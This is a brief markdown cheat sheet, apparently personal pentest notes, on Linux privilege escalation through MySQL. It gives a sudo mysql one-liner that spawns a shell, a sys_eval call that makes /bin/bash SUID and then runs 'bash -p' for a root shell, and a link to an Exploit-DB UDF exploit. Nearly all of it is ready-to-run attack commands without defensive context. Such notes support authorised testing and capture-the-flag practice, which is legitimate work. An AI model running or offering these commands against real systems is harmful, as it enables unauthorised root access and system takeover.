# Sudo
```bash
sudo mysql -e '\! /bin/sh'
```
# SUID
```SQL
> select sys_eval(“chmod u+s /bin/bash”);
    /bin/bash -p 
```
# Ps aux
```
https://www.exploit-db.com/exploits/1518
```
